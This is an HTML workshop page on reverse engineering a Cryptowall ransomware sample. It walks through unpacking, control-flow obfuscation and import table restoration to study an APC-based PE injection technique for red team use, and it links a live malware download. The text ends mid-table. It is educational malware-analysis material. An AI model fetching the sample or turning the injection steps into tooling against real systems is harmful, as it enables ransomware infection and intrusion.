
<!doctype html>

<html>
<head>
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
  <meta name="theme-color" content="#4F7DC9">
  <meta charset="UTF-8">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:site" content="@malwareunicorn">
  <meta name="twitter:creator" content="@malwareunicorn">
  <meta name="twitter:title" content="Portable Executable Injection Study">
  <meta name="twitter:description" content="This workshop will go over the reverse engineering steps for looking at Cryptowall malware for the purposes of extracting information on the code injection technique in order to replicate for red team operation use.">
  <meta name="twitter:image" content="https://malwareunicorn.org/peinjection/img/12517b65ec5bf16f.gif">
  <title>Portable Executable Injection Study</title>
  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
  <link rel="stylesheet" href="../pkg/codelab-elements.css">
  <style>
    .success {
      color: #1e8e3e;
    }
    .error {
      color: red;
    }
  </style>
  <script src="../gif/webcomponentsjs/webcomponents-loader.js"></script>
</head>
<body>
  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
  <google-codelab codelab-gaid=""
                  id="peinjection"
                  title="Portable Executable Injection Study"
                  environment="web"
                  feedback-link="">
    
      <google-codelab-step label="Introduction" duration="0">
        <p><strong>Last Updated:</strong> 2021-07-26</p>
<p>The intent of this workshop is to reverse engineer existing malware to extract the portable executable (PE) injection technique to be replicated for use for red team operation tooling. The content of this workshop will begin by reverse engineering the malware Cryptowall and then go over the injection technique. The injection sequence consists of writing code into a newly created executable section in the target process, then using NtQueueApcThread to execute the target code.</p>
<h2 is-upgraded>What you&#39;ll do</h2>
<p>Reverse engineer the malware Cryptowall to replicate the PE injection technique.</p>
<h2 class="checklist" is-upgraded>What you&#39;ll learn</h2>
<ul class="checklist">
<li>Recognizing and bypassing a custom unpacking routine</li>
<li>Recognizing control flow obfuscation</li>
<li>Recognizing import table restoration</li>
<li>View new executable memory sections in a newly created process</li>
<li>Work with undocumented Windows API</li>
<li>Walk through a portable executable injection routine</li>
<li>How Asynchronous Procedure Calls (APC) work</li>
<li> Writing PE injection in Golang</li>
</ul>
<h2 is-upgraded>What you&#39;ll need</h2>
<ul>
<li>Virtual Machine with Windows 10</li>
<li>At least 4 GB of RAM</li>
<li>At least 20 GB of storage</li>
<li>Ida Pro/Free Disassembler</li>
<li>X64dbg</li>
<li>7Zip</li>
<li>Sysinternals Suite</li>
<li>PE Bear</li>
</ul>


      </google-codelab-step>
    
      <google-codelab-step label="Background" duration="1">
        <p>In summer of 2021, I needed to mentor a simple reverse engineering session. The topic focused around looking at process injection but more specifically process hollowing techniques. So I decided to go over the techniques used in various malware samples so that the mentee could get a feel for replicating the techniques used by real malware. Cryptowall malware seemed to fit the use case and is the content you see here.</p>
<p>Note that this workshop is not geared to fully reverse engineer attributes of ransomware, instead this workshop focuses on getting through the unpacking routine to get to the meat of the process injection technique.</p>
<h2 is-upgraded>Cryptowall</h2>
<p>During my search for malware samples, I came across a 2016 <a href="https://www.lastline.com/labsblog/a-peek-behind-the-cryptowall/" target="_blank">blog</a> that talked about the PE injection technique used in this workshop. Instead of using the actual sample in the blog, I decided to go on VirusTotal to look for something similar but more recent:</p>
<ul>
<li><a href="https://www.virustotal.com/gui/file/546817e28100127124a0368050cbe6ecd1ea7a64c0bdfbef14823bb77404c42b/detection" target="_blank">546817e28100127124a0368050cbe6ecd1ea7a64c0bdfbef14823bb77404c42b</a></li>
<li>First Submission 2020-01-18</li>
<li>Last Submission 2020-01-31</li>
<li>Original Name: SDFormatter.exe</li>
<li>Arch: x32</li>
</ul>
<p>Here are some diagrams I made to best describe a high level overview of the unpacking routine and the PE injection routine:</p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/e27d1b393a3e3634.gif"></p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/12517b65ec5bf16f.gif"></p>


      </google-codelab-step>
    
      <google-codelab-step label="Environment Setup" duration="120">
        <p>If you haven&#39;t already, please take the <a href="https://malwareunicorn.org/workshops/re101.html" target="_blank">RE101</a> workshop. The environment setup is the same. </p>
<h2 is-upgraded>Download the Unknown Malware</h2>
<aside class="warning"><p>Download the binary for this Lab: <a href="https://storage.googleapis.com/malwareunicorn-storage/virtual_machines/Cryptowall_6459414638526464.zip" target="_blank"><paper-button class="colored" raised><iron-icon icon="file-download"></iron-icon>Download Malware Zip</paper-button></a></p>
<p>password: infected</p>
<p><strong>WARNING - DO NOT UNZIP OR RUN THIS OUTSIDE OF A NETWORK ISOLATED VM</strong></p>
</aside>
<h4 is-upgraded>Sha1 for 7z file</h4>
<pre><code>17443fe656563f7734b18aca3989a5cf0a495817</code></pre>
<h4 is-upgraded>Sha256 Malware inside</h4>
<pre><code>546817e28100127124a0368050cbe6ecd1ea7a64c0bdfbef14823bb77404c42b</code></pre>
<ol type="1" start="1">
<li>Run the Victim VM and copy over the malware.zip into the VM.</li>
<li>Unzip Warning - DO NOT UNZIP THIS OUTSIDE OF THE VM</li>
</ol>


      </google-codelab-step>
    
      <google-codelab-step label="PE Injection" duration="1">
        <p>As I would love to explain PE injection for you, one of my former interns has done wonderful job at explaining process injection along with 10 different types of techniques: <a href="https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" target="_blank">Ten process injection techniques: A technical survey of common and trending process injection techniques</a> </p>
<p>Checkout MalwareTech&#39;s breakdown here: <a href="https://www.malwaretech.com/2013/11/portable-executable-injection-for.html" target="_blank">Portable Executable Injection For Beginners</a> </p>
<p>So I wanted to clarify some things about this workshop based on what is actually happening in this malware sample. There was some debate on what to technically label the technique being used here. Even though this cryptowall sample is not making a codecave or unmapping the original target process, it does force the injected code to execute in place of the original explorer.exe code. So that technically puts it under process hollowing, but it seems more like generic code injection using APC threads.</p>
<table>
<tr><td colspan="1" rowspan="1"><p>Technique</p>
</td><td colspan="1" rowspan="1"><p>This workshop</p>
</td><td colspan="1" rowspan="1"><p>PE Injection</p>
</td><td colspan="1" rowspan="1"><p>DLL Injection</p>
</td><td colspan="1" rowspan="1"><p>Code Injection</p>
</td><td colspan="1" rowspan="1"><p>Process Hollowing</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>Uses Code Cave</p>
</td><td colspan="1" rowspan="1"><p>No</p>
</td><td colspan="1" rowspan="1"><p>Sometimes</p>
</td><td colspan="1" rowspan="1"><p>Sometimes</p>
</td><td colspan="1" rowspan="1"><p>Sometimes</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>Unmapping Target</p>
</td><td colspan="1" rowspan="1"><p>No</p>
</td><td colspan="1" rowspan="1"><p>Sometimes</p>
</td><td colspan="1" rowspan="1"><p>No</p>
</td><td colspan="1" rowspan="1"><p>No</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>Create New Section</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>Sometimes</p>
</td><td colspan="1" rowspan="1"><p>Sometimes</p>
</td><td colspan="1" rowspan="1"><p>Sometimes</p>
</td><td colspan="1" rowspan="1"><p>Sometimes</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>Requires Image to be Mapped</p>
</td><td colspan="1" rowspan="1"><p>No</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>No</p>
</td><td colspan="1" rowspan="1"><p>Sometimes</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>Uses Position Independent Code (Shellcode)</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>Not really</p>
</td><td colspan="1" rowspan="1"><p>Not really</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>Sometimes</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>IAT Fix Needed</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>Target Process Still Executes Original Code</p>
</td><td colspan="1" rowspan="1"><p>No</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>Yes</p>
</td><td colspan="1" rowspan="1"><p>No</p>
</td></tr>
</table>


      </google-codelab-step>
    
      <google-codelab-step label="Manual Unpacking: Extracting the First Routine" duration="20">
        <p>When you initially open the binary in Ida Pro you will notice that there are only two functions that are available. Obviously there are more functions than just these but your first guess should be that this malware is either encrypted, packed, or the PE header is manipulated. </p>
<p class="image-container"><img style="width: 178.00px" src="../peinjection/img/bb8fe35005bc62c6.png"></p>
<h3 is-upgraded>Identifying decrypting routines</h3>
<p>If you look at the graph view in Ida, there is a loop that happens at the end of the graph. Within this loop, there is a call to function code that doesn&#39;t exist within the data section. </p>
<table>
<tr><td colspan="1" rowspan="1"><p class="image-container"><img style="width: 610.00px" src="../peinjection/img/add8d66515565a49.png"></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p class="image-container"><img style="width: 610.00px" src="../peinjection/img/e9a9da3caa11ae74.png"></p>
</td></tr>
</table>
<p>When you see a pattern like this, it is actually a data manipulation loop:</p>
<ol type="1" start="1">
<li>A compare instruction followed by a branch instruction.</li>
<li>A movement of data to a pointer of empty bytes or existing blob of data.</li>
<li>A jump to complete the loop.</li>
<li>Then finally an exit to the loop that ends with jumping to the newly written bytes.</li>
</ol>
<p class="image-container"><img style="width: 362.72px" src="../peinjection/img/9d4090fb30fce17c.png"></p>
<p>In order to get to the actual code you will need to use a debugger to get through this unpacking loop. While it is possible to do it by hand, it&#39;s easier to use a debugger!</p>
<h3 is-upgraded>Let&#39;s start debugging!</h3>
<p>Now let&#39;s open up our debugger and set some breakpoints. Make sure to place your breakpoint (F2) after the <code>JNZ</code> call. Next make a breakpoint on the call to the unpacked code. </p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/ca7a8c0f6b382bfc.png"></p>
<p>Now run the program (F9) so that the instruction pointer stops at the call to the unpacked code. </p>
<p>In the debugger, right click on the address of the call to the unpacked code. Select the option to dump the value of that address. </p>
<p class="image-container"><img style="width: 653.34px" src="../peinjection/img/84090af9d91ceea5.png"></p>
<p>Below is the dump of that address. As you can see, the first value is <code>0xEB</code>, which is a <code>JMP</code> instruction. </p>
<p class="image-container"><img style="width: 524.00px" src="../peinjection/img/9e2f01e50851cbec.png"></p>
<p>Next, step into (F7) the call so that you land in the section of code that you dumped earlier. Throughout this binary, you will be using the same type of method to get to the unpacked code. </p>
<aside class="warning"><p><strong>Tip:</strong> It is always best to place a breakpoint at the start of the code in which you are jumping to. Sometimes the debugger won&#39;t allow you to place a software breakpoint, instead place a hardware or memory execution breakpoint on the byte at that address. Also if you place a breakpoint to an address that does not already exist, you will need to re-enable the breakpoint again in the Breakpoints Tab once that address space exists again.</p>
</aside>


      </google-codelab-step>
    
      <google-codelab-step label="Unpacking: Control Flow Obfuscation" duration="0">
        <p class="image-container"><img style="width: 302.50px" src="../peinjection/img/91ab95ec581af519.gif"></p>
<p>The next part of the code is obfuscated using control flow obfuscation. The code is basically broken up into one or two lines of opcodes followed by a jump. Notice the mov esp, ebp instruction which is typical for a function prologue.</p>
<aside class="special"><p><strong>Note: </strong>This is typically an assembly instruction that appears in a <a href="https://en.wikipedia.org/wiki/Function_prologue" target="_blank">function prologue</a>. Function prologues typically begin with a <code>push ebp, mov esp, ebp</code> in Windows.</p>
</aside>
<table>
<tr><td colspan="1" rowspan="1"><p class="image-container"><img style="width: 610.00px" src="../peinjection/img/28723349e5869c9e.png"></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p class="image-container"><img style="width: 610.00px" src="../peinjection/img/76339fc796489d7f.png"></p>
</td></tr>
</table>
<p>Because Ida pro can&#39;t show this nicely in a graph view right away, you will need to do a combination of these methods:</p>
<ul>
<li>Traverse the jumps in the debugger in order to figure out what is happening in this section. </li>
<li>and/or dump the code that was decrypted. You can do this by checking the compared up code to get the size then select the offset along with the size and dump to a binary file. Next open in Ida and adjust the segments so that the image base reflects the address you extracted it from.</li>
<li>and/or use the debugger to display the control flow graph. </li>
</ul>
<p>Keep going until you find a <code>XOR</code> opcode.  Whenever you see the opcode <code>XOR</code> with a data pointer value and a single byte register value this means it is decrypting a section of code. </p>
<p class="image-container"><img style="width: 374.00px" src="../peinjection/img/4cf6b93086c21e3e.png"></p>
<p>The next thing you will need to find is where the loop ends. A loop always consists of an increment statement and a comparison statement, then a branch after the comparison. You will need to look for this branch. Below are excerpts extracted from the obfuscated control flow.</p>
<pre><code>0041122E | 39F1                     | cmp ecx,esi              
004112E0 | 72 78                    | jb 546817.41135A
004111C4 | 58                       | pop eax                                
00411253 | FFE0                     | jmp eax                               
Size is 0xC80 </code></pre>
<p>In your debugger, set a breakpoint on the <code>JMP EAX</code> so that you can step into the newly decrypted code. Run the program so it lands on your break point.  Next you will need to dump that memory address so that you can extract the binary data. You can either patch the original executable using a hex editor or bring the binary data into Ida so that you can analyze it.</p>
<aside class="warning"><p><strong>Tip:</strong> In x32dbg, you can search for instruction expressions by using the shortcut ctrl-f while in the CPU view. It helps to search (CTRL-F while in the CPU view) for <code>JMP EAX</code> and place breakpoints on it to cut down on debugging. Be sure to always confirm with Ida that the breakpoint you set is a valid instruction in the route you want to go.</p>
</aside>


      </google-codelab-step>
    
      <google-codelab-step label="Unpacking: Setting up Imports and Final Unpacking" duration="20">
        <aside class="warning"><p><strong>Tip:</strong> It is always best to use Ida as your roadmap for stepping instructions in the debugger. If you know the starting address and size of this code you can dump it using your debugger, then open the binary dump in Ida. Remember that this malware is running as a 32bit binary, so be sure to open it in Ida with that mode. Just use the default processor (Meta-PC).</p>
</aside>
<p>The next section of code is an unpacker. It&#39;s easy to identify Packers by looking for the <code>LOOP</code> opcode as well as the <code>PUSHAD/POPAD</code> opcode combination.</p>
<p class="image-container"><img style="width: 598.00px" src="../peinjection/img/57d8bba24ba2656.png"></p>
<p>.</p>
<p>Set a breakpoint on the instruction after the <code>JNE</code> instruction at <code>0x0041CBDF</code> and continue to run to that breakpoint so that you can skip the loop.</p>
<p>This next routine uses a trick to add strings onto the stack by using a <code>CALL</code> instruction. When a call is made, what comes after the call is placed on the stack because this is considered the return address.</p>
<aside class="special"><p><strong>Note: </strong><em>What is the difference between a </em><em><code>JMP</code></em><em> and a </em><em><code>CALL</code></em><em> instruction?</em> They may have similar opcodes but a <code>CALL</code> instruction will push the current <code>EIP</code> also known as the return-instruction address onto the stack.</p>
</aside>
<p>This is a sneaky way to place strings onto the stack typically used in shellcode. In this case, it is doing <code>CALL, POP EAX, ADD EAX,3</code> to shift the address to point to GetProcAddress.</p>
<aside class="warning"><p><strong>Tip: </strong><em>Where are these API like GetProcAddress being used?</em> In this routine, calls to API are going to be placed on the stack. While in the debugger, whenever you see an instruction such as <code>call dword ptr [ebp-24h]</code>, you can right-click on the address ebp-24h and follow in the disassembler view. This will take you to the api code and it will display the export name of the API. To get back to where you were, you can right-click the EIP address and follow in the disassembler view. I suggest filling in these API calls as comments where the call instructions are in Ida.</p>
</aside>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/8292a279844abf3a.png"></p>
<p>This rest of this code sets up the unpacking routine in a newly allocated memory section at 0x30000. You will want to continue to step through to find the next instruction for <code>JMP EAX</code> and place a breakpoint. Once your <code>EIP</code> is on 0x41CF7B where the <code>JMP EAX</code> is located, step into that address. </p>
<aside class="special"><p><strong>Note:</strong> Be sure to save the address in JMP EAX (EAX=0x303E4). This will serve as the entrypoint to the next portion of code at memory section 0x30000 and you will need this for Ida.</p>
</aside>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/684310342d59fe3e.png"></p>
<aside class="warning"><p><strong>Tip:</strong> It is always best to use Ida as your roadmap for stepping instructions in the debugger. In x32dbg, there is a Tab called Memory Map which contains all the mapped memory sections associated with the process. Typically code that is planned to be executed will have the memory mapped section&#39;s protection to be Read/Write/Execute or ERW---. You can right-click on the memory 0x30000, and dump it to a binary file. Next you can open this binary file in Ida to follow along in the debugger.</p>
</aside>
<aside class="warning"><p><strong>Tip: </strong><em>So you opened the binary dump of memory section 0x30000 in Ida, now what?</em> Whenever you open binary data into Ida, Ida has no idea that this code started at 0x3000 because there is no PE header info to tell it how to set it up. You will need to &#34;rebase&#34; the image address of your binary data. To rebase your image, go to <strong><em>Edit-&gt;Segments-&gt;Rebase Program-&gt;Select Image Base</em></strong> and set it to 0x30000 (the start address of the memory section). Now you will be able to follow along in the debugger.</p>
</aside>
<aside class="special"><p><strong>Note:</strong> Now you rebased the image in Ida, so how come it&#39;s not disassembled like in the debugger? Ida Pro&#39;s disassembly is a flow-oriented disassembly vs. a linear disassembly like the debugger. This means that Ida will follow calls, jmp, and return and disassemble as it follows that flow.</p>
<p>You may have seen a pop-up that said &#34;<strong><em>IDA cannot identify the entry point automatically as there is no standard for binaries. Please move to what you think is an entry point and press &#34;C&#34; to start the autoanalysis.</em></strong>&#34; You should have saved the entrypoint from the <code>JMP EAX</code> instruction as <code>0x303E4</code>. Go to that address by pressing the shortcut key &#34;g&#34;.</p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/28cfc4674c473804.png"></p>
<p>You may ask, <em>what the heck is this garbage?</em> Ida is trying to parse this section as double dwords (dd) but obviously you aren&#39;t able to view the bytes at your entrypoint address. You will need to &#34;undefine&#34; this auto parsing. Select the dd you want to undefine and press the shortcut key &#34;u&#34;. Now select the byte at the entrypoint address 0x303E4 and press the shortcut key &#34;c&#34; to convert these bytes into &#34;code&#34;/disassembly. </p>
<p>Now it&#39;s your job as the reverse engineer to manually convert wrongly parsed bytes into disassembly.</p>
</aside>
<h2 is-upgraded>Self modification</h2>
<p>This next routine of code prepares the meat of the Cryptowall code by placing the unpacked code in the beginning of the text section and modifying the header of its own process memory image. Be sure to save a copy of the original header because in the original blog they mentioned that the section table was corrupted after the modification.  Next, continue to step through to search for the instruction <code>JMP EAX</code> and step into.</p>
<aside class="warning"><p><strong>Tip: </strong><em>Breakpoint failed or address doesn&#39;t exist?</em> Sometimes you have to wait for a memory section to exist before setting a breakpoint or you might have to re-enable a breakpoint. The easiest method is to just set a hardware execute breakpoint on the byte at that address</p>
</aside>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/9e3014faff4ac797.png"></p>


      </google-codelab-step>
    
      <google-codelab-step label="Unpacking: Cryptowall Unpacked Code" duration="1">
        <p>Once you&#39;ve reached the unpacked code, it&#39;s best to dump out the text section starting from 0x401000 of this executable from process memory. This way you can place this unpacked code by overwriting the original executable using a hex editor so that you can follow along in Ida Pro. Why not dump the whole thing, header and all? Because Cryptowall corrupts the section header. It&#39;s best to just keep the original header and modify the entrypoint using PEBear.</p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/a127496c840bac0d.png"></p>


      </google-codelab-step>
    
      <google-codelab-step label="Unpacking: Import Table Restoration" duration="20">
        <p>With every unpacking routine there&#39;s always going to be a method to restore the import table. The first function in the unpacked code is setting up the import table at 0x4016F0. To identify this type of method you will see either a loop or a continuous calling of the same function to store the addresses of functions into an array. Typically malware stores these functions represented by hashes or offsets and stores them in the .data section or in the instructions themselves. Once you have access to the import table it will be easy to fill in the dynamic calls to these functions in your disassembler. </p>
<p class="image-container"><img style="width: 486.00px" src="../peinjection/img/91a6641f688293d0.png"></p>
<p>I would recommend that you start filling in the API calls in Ida so that you can follow along with the debugger. </p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/91eefdebbe300628.png"></p>
<p>Below is the new memory allocation at 0x1D0000 for the import table.You can view this by right-clicking on the address and dumping to the Dump panel in x32dbg.</p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/851bc1e29e58dc7f.png"></p>
<p>Notable API calls from the Import Table (I did not include all of them here):</p>
<table>
<tr><td colspan="1" rowspan="1"><p><strong>Offset (hex)</strong></p>
</td><td colspan="1" rowspan="1"><p><strong>API Call</strong></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>0</p>
</td><td colspan="1" rowspan="1"><p>ZwClose</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>4</p>
</td><td colspan="1" rowspan="1"><p>LdrLoadDll</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>8</p>
</td><td colspan="1" rowspan="1"><p>LdrGetProcedureAddress</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>C</p>
</td><td colspan="1" rowspan="1"><p>NtAllocateVirtualMemory</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>10</p>
</td><td colspan="1" rowspan="1"><p>ZwFreeVirtualMemory</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>14</p>
</td><td colspan="1" rowspan="1"><p>NtProtectVirtualMemory</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>18</p>
</td><td colspan="1" rowspan="1"><p>ZwQueryVirtualMemory</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>1C</p>
</td><td colspan="1" rowspan="1"><p>ZwWriteVirtualMemory</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>20</p>
</td><td colspan="1" rowspan="1"><p>ZwReadVitrualMemory</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>24</p>
</td><td colspan="1" rowspan="1"><p>ZwWow64ReadVirtualMemory64</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>28</p>
</td><td colspan="1" rowspan="1"><p>RtlFreeHeap</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>2C</p>
</td><td colspan="1" rowspan="1"><p>memset</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>30</p>
</td><td colspan="1" rowspan="1"><p>memcopy</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>38</p>
</td><td colspan="1" rowspan="1"><p>memchr</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>3C</p>
</td><td colspan="1" rowspan="1"><p>ZwCreateEvent</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>40</p>
</td><td colspan="1" rowspan="1"><p>ZwOpenEvent</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>44</p>
</td><td colspan="1" rowspan="1"><p>ZwSetEvent</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>48</p>
</td><td colspan="1" rowspan="1"><p>NtWaitForSingleObject</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>4C</p>
</td><td colspan="1" rowspan="1"><p>ZwWaitForMultipleObjects</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>50</p>
</td><td colspan="1" rowspan="1"><p>NtQuerySystemInformation</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>54</p>
</td><td colspan="1" rowspan="1"><p>NtShutdownSystem</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>58</p>
</td><td colspan="1" rowspan="1"><p>RtlGetNtProductType</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>5C</p>
</td><td colspan="1" rowspan="1"><p>ZwOpenProcess</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>60</p>
</td><td colspan="1" rowspan="1"><p>NtTerminateProcess</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>64</p>
</td><td colspan="1" rowspan="1"><p>ZwQueryInformationProcess</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>68</p>
</td><td colspan="1" rowspan="1"><p>NtDelayExecution</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>6C</p>
</td><td colspan="1" rowspan="1"><p>RtlAdjustPrivilege</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>70</p>
</td><td colspan="1" rowspan="1"><p>RtlSetProcessIsCritical</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>74</p>
</td><td colspan="1" rowspan="1"><p>ZwOpenThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>78</p>
</td><td colspan="1" rowspan="1"><p>​​ZwTerminateThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>7C</p>
</td><td colspan="1" rowspan="1"><p>NtResumeThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>80</p>
</td><td colspan="1" rowspan="1"><p>NtSuspendThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>84</p>
</td><td colspan="1" rowspan="1"><p>ZwQueryInformationThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>88</p>
</td><td colspan="1" rowspan="1"><p>ZwImpersonateThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>8C</p>
</td><td colspan="1" rowspan="1"><p>RtlCreateUserThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>90</p>
</td><td colspan="1" rowspan="1"><p>ZwCreateThreadEx</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>94</p>
</td><td colspan="1" rowspan="1"><p>CsClientCallServer</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>98</p>
</td><td colspan="1" rowspan="1"><p>ZwWow64CsrClientCallServer</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>9C</p>
</td><td colspan="1" rowspan="1"><p>NtGetContextThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>A0</p>
</td><td colspan="1" rowspan="1"><p>ZwSetContextThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>A4</p>
</td><td colspan="1" rowspan="1"><p>RtlExitUserThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>A8</p>
</td><td colspan="1" rowspan="1"><p>NtQueueApcThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>AC</p>
</td><td colspan="1" rowspan="1"><p>NtSetInformationThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>B0</p>
</td><td colspan="1" rowspan="1"><p>ZwOpenProcessToken</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>B4</p>
</td><td colspan="1" rowspan="1"><p>NtQueryInformationToken</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>B8</p>
</td><td colspan="1" rowspan="1"><p>ZwCreateFile</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>C0</p>
</td><td colspan="1" rowspan="1"><p>ZwWriteFile</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>C4</p>
</td><td colspan="1" rowspan="1"><p>NtReadFile</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>C8</p>
</td><td colspan="1" rowspan="1"><p>ZwDeleteFile</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>CC</p>
</td><td colspan="1" rowspan="1"><p>ZwQueryInformationFile</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>D0</p>
</td><td colspan="1" rowspan="1"><p>NtSetInformationFile</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>D4</p>
</td><td colspan="1" rowspan="1"><p>ZwQueryVolumeInformationFile</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>D8</p>
</td><td colspan="1" rowspan="1"><p>NtCreateSection</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>DC</p>
</td><td colspan="1" rowspan="1"><p>ZwMapViewOfSection</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>E0</p>
</td><td colspan="1" rowspan="1"><p>ZwUnmapViewOfSection</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>E4</p>
</td><td colspan="1" rowspan="1"><p>RtlCreateSecurityDescriptor</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>E8</p>
</td><td colspan="1" rowspan="1"><p>RtlSetDaclSecurityDescriptor</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>EC</p>
</td><td colspan="1" rowspan="1"><p>NtSetSecurityObject</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>F0</p>
</td><td colspan="1" rowspan="1"><p>ZwCreateKey</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>F4</p>
</td><td colspan="1" rowspan="1"><p>ZwOpenKey</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>F8</p>
</td><td colspan="1" rowspan="1"><p>ZwQueryKey</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>FC</p>
</td><td colspan="1" rowspan="1"><p>ZwDeleteKey</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>100</p>
</td><td colspan="1" rowspan="1"><p>ZwQueryValueKey</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>104</p>
</td><td colspan="1" rowspan="1"><p>ZwSetValueKey</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>108</p>
</td><td colspan="1" rowspan="1"><p>NtDeleteValueKey</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>10C</p>
</td><td colspan="1" rowspan="1"><p>ZwRenameKey</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>134</p>
</td><td colspan="1" rowspan="1"><p>wcscat</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>170</p>
</td><td colspan="1" rowspan="1"><p>RtlDosPathNameToNtPathName_U</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>12C</p>
</td><td colspan="1" rowspan="1"><p>wcsncpy</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>15C</p>
